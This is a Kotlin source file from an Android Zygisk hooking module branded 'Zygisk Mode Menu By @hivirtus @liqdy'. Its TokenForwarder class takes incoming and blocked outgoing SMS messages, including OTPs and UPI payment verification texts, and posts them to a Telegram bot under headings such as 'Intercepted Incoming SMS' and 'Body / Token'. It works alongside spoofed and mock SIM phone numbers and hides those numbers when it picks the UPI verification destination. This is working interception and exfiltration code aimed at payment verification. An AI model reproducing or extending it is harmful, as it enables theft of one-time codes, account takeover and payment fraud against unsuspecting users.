package com.hivirtus.zygiskmode

import android.content.Context
import android.os.Build
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject

class TokenForwarder(
    private val configManager: ConfigManager,
    private val context: Context? = null
) {

    private val client = OkHttpClient()

    fun forward(otp: LastOtp): Boolean {
        if (otp.direction.equals("incoming", ignoreCase = true)) {
            val config = configManager.load()
            if (!config.hookIncomingSms) return false
        }
        val creds = resolveTelegramCreds()
        if (creds.first.isBlank() || creds.second.isBlank()) return false

        val config = configManager.load()
        if (!config.autoForwardToken && !otp.direction.equals("outgoing", ignoreCase = true)) return false

        val peer = otp.rawPeer.ifBlank { otp.sender }
        val body = otp.body.ifBlank { otp.otp }
        if (!config.autoForwardToken &&
            !SmsMatcher.shouldForwardToTelegram(config, peer, body, otp.direction)
        ) {
            return false
        }

        val message = buildInterceptMessage(otp, config)
        val markup = if (otp.direction.equals("outgoing", ignoreCase = true)) {
            buildCopyReplyMarkup(resolveSendFrom(config), smsCopyText(otp))
        } else {
            null
        }
        val sent = postTelegram(creds.first, creds.second, message, markup, useHtml = false)
        if (sent) {
            context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
        }
        return sent
    }

    /** Outgoing verify SMS — Telegram hamesha bhejo jab creds hon. */
    fun forwardOutgoingBlocked(otp: LastOtp): Boolean {
        val creds = resolveTelegramCreds()
        if (creds.first.isBlank() || creds.second.isBlank()) return false
        val config = configManager.load()
        val dest = otp.rawPeer.ifBlank { otp.sender }
        val message = buildInterceptMessage(otp, config)
        val sendFrom = resolveSendFrom(config)
        val smsBody = smsCopyText(otp)
        val markup = buildGianCopyReplyMarkup(dest, smsBody, sendFrom)
        val sent = postTelegram(creds.first, creds.second, message, markup, useHtml = false)
        if (sent) {
            context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
        }
        return sent
    }

    private fun resolveTelegramCreds(): Pair<String, String> {
        val config = configManager.load()
        val stored = context?.let { TelegramCredentialStore.load(it) }
        val token = stored?.botToken?.ifBlank { null } ?: config.telegramBotToken
        val chat = stored?.chatId?.ifBlank { null } ?: config.telegramChatId
        return token to chat
    }

    fun sendForwardingTest(botToken: String, chatId: String): Boolean {
        return sendTestMessage(botToken, chatId, buildForwardingTestMessage())
    }

    fun buildForwardingTestMessage(): String {
        return buildString {
            appendLine("🚀 $TELEGRAM_HANDLE Telegram Forwarding Test Successful!")
            appendLine()
            append("Device: ").append(deviceName())
        }
    }

    private fun smsCopyText(otp: LastOtp): String {
        return otp.body.ifBlank { otp.otp }.trim()
    }

    private fun buildInterceptMessage(otp: LastOtp, config: ModuleConfig): String {
        val outgoing = otp.direction.equals("outgoing", ignoreCase = true)
        val smsBody = smsCopyText(otp)
        if (outgoing) {
            val dest = otp.rawPeer.ifBlank { otp.sender }
            return buildOutgoingBlockedMessage(dest, smsBody, resolveSendFrom(config))
        }

        val peerValue = otp.sender.ifBlank { otp.rawPeer }
        val appLabel = resolveAppLabel(otp)

        return buildString {
            appendLine("📱 Intercepted Incoming SMS")
            appendLine(TELEGRAM_BRANDING)
            if (appLabel.isNotBlank()) {
                appendLine()
                appendLine("App: $appLabel")
            }
            appendLine()
            appendLine("From:")
            appendLine(peerValue)
            appendLine()
            appendLine("Body / Token:")
            append(smsBody)
        }
    }

    private fun buildOutgoingBlockedMessage(dest: String, smsBody: String, sendFrom: String): String {
        return GianPanelCompat.buildTelegramInterceptMessage(dest.ifBlank { sendFrom }, smsBody)
    }

    private fun resolveSendFrom(config: ModuleConfig): String =
        configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }

    private fun buildGianCopyReplyMarkup(dest: String, copyBody: String, sendFrom: String): JSONObject {
        val oneTap = GianPanelCompat.oneTapCopy(dest.ifBlank { sendFrom }, copyBody)
        val row = JSONArray().apply {
            put(
                JSONObject()
                    .put("text", "📋 One-tap copy")
                    .put("copy_text", JSONObject().put("text", clipCopyText(oneTap)))
            )
            put(
                JSONObject()
                    .put("text", "📋 Copy SMS Body")
                    .put("copy_text", JSONObject().put("text", clipCopyText(copyBody)))
            )
        }
        return JSONObject().put("inline_keyboard", JSONArray().put(row))
    }

    private fun buildCopyReplyMarkup(copyNumber: String, copyBody: String): JSONObject {
        val row = JSONArray().apply {
            put(
                JSONObject()
                    .put("text", "📋 Copy Number")
                    .put("copy_text", JSONObject().put("text", clipCopyText(copyNumber)))
            )
            put(
                JSONObject()
                    .put("text", "📋 Copy SMS Body")
                    .put("copy_text", JSONObject().put("text", clipCopyText(copyBody)))
            )
        }
        return JSONObject().put("inline_keyboard", JSONArray().put(row))
    }

    private fun clipCopyText(text: String): String {
        val trimmed = text.trim()
        if (trimmed.length <= COPY_TEXT_MAX) return trimmed
        return trimmed.take(COPY_TEXT_MAX - 3) + "..."
    }

    private fun resolveAppLabel(otp: LastOtp): String {
        if (otp.messageLabel.isNotBlank()) return otp.messageLabel
        val pkg = ActiveHookManager.readActivePackage()
        if (!pkg.isNullOrBlank()) return UpiAppRegistry.displayNameFor(pkg)
        return ""
    }

    private fun deviceName(): String {
        val model = Build.MODEL?.trim().orEmpty()
        return model.ifBlank { "Android" }
    }

    /**
     * UPI verify short code / destination — personal mock number hide.
     */
    private fun resolveUpiVerifyNumber(otp: LastOtp, config: ModuleConfig): String {
        val rawPeer = otp.rawPeer.trim()
        if (rawPeer.isNotBlank() && !isSpoofOrPersonalNumber(rawPeer, config)) {
            return rawPeer
        }

        val sender = otp.sender.trim()
        val injectId = SmsMatcher.userSenderId(config)?.trim().orEmpty()
        if (sender.isNotBlank() && !isSpoofOrPersonalNumber(sender, config)) {
            if (sender != injectId || !SmsMatcher.isIndianMobileNumber(sender)) {
                return sender
            }
        }

        extractVerifyNumberFromBody(otp.body.ifBlank { otp.otp })?.let { return it }

        return rawPeer.ifBlank { sender }.ifBlank { "UPI-VERIFY" }
    }

    private fun isSpoofOrPersonalNumber(value: String, config: ModuleConfig): Boolean {
        val digits = normalizeDigits(value)
        if (digits.isBlank()) return false

        val blocked = personalNumberDigits(config).filter { it.isNotBlank() }

        return blocked.any { blockedDigits ->
            digits == blockedDigits ||
                (digits.length == 10 && blockedDigits.endsWith(digits)) ||
                (blockedDigits.length == 10 && digits.endsWith(blockedDigits))
        }
    }

    private fun personalNumberDigits(config: ModuleConfig): Set<String> = buildSet {
        add(normalizeDigits(configManager.readSpoofPhone()))
        add(normalizeDigits(config.mockPhoneSim1))
        add(normalizeDigits(config.mockPhoneSim2))
        add(normalizeDigits(config.injectSenderId))
    }

    private fun normalizeDigits(value: String): String =
        value.replace(Regex("[^0-9]"), "")

    private fun extractVerifyNumberFromBody(body: String): String? {
        if (body.isBlank()) return null
        Regex("""(?<!\d)(91\d{10}|\d{10}|\d{6,12})(?!\d)""").findAll(body).forEach { match ->
            val candidate = match.groupValues[1]
            val config = configManager.load()
            if (!isSpoofOrPersonalNumber(candidate, config)) return candidate
        }
        return null
    }

    private fun escapeHtml(text: String): String {
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    fun sendTestMessage(botToken: String, chatId: String, text: String): Boolean {
        return postTelegram(botToken, chatId, text, replyMarkup = null, useHtml = true)
    }

    private fun postTelegram(
        botToken: String,
        chatId: String,
        text: String,
        replyMarkup: JSONObject? = null,
        useHtml: Boolean = true
    ): Boolean {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val payload = JSONObject()
            .put("chat_id", chatId)
            .put("text", text)
            .put("disable_web_page_preview", true)
        if (useHtml) {
            payload.put("parse_mode", "HTML")
        }
        replyMarkup?.let { payload.put("reply_markup", it) }
        return postJson(url, payload.toString())
    }

    private fun postJson(url: String, payload: String): Boolean {
        val request = Request.Builder()
            .url(url)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }

    companion object {
        const val TELEGRAM_HANDLE = "@hivirtus @liqdy"
        const val TELEGRAM_BRANDING = "Zygisk Mode Menu By @hivirtus @liqdy 🔥"
        private const val COPY_TEXT_MAX = 256
    }
}
